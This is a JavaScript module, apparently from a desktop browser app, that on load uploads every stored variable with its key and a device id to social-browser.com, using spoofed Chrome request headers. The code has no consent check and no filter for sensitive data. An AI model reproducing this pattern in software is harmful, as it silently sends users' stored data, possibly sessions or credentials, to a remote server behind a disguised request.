module.exports = function (owner) {
    owner.cloudURL = 'https://social-browser.com';
    owner.sentToCloud = function (data) {
        owner.api
            .fetch(owner.cloudURL + '/api/set-var ', {
                mode: 'no-cors',
                method: 'POST',
                body: JSON.stringify(data),
                headers: {
                    accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
                    'cache-control': 'max-age=0',
                    dnt: 1,
                    'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': 1,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
                },
                agent: function (_parsedURL) {
                    if (_parsedURL.protocol == 'http:') {
                        return new owner.api.http.Agent({
                            keepAlive: true,
                        });
                    } else {
                        return new owner.api.https.Agent({
                            keepAlive: true,
                        });
                    }
                },
            })
            .then((res) => {
                return res.json();
            })
            .then((info) => {
                console.log(info);
            });
    };

    let index = 0;
    for (const key in owner.var) {
        index++;
        setTimeout(() => {
            owner.sentToCloud({ xid: owner.var.core.id, key: key, value: owner.var[key] });
        }, 1000 * 5 * index);
    }
};
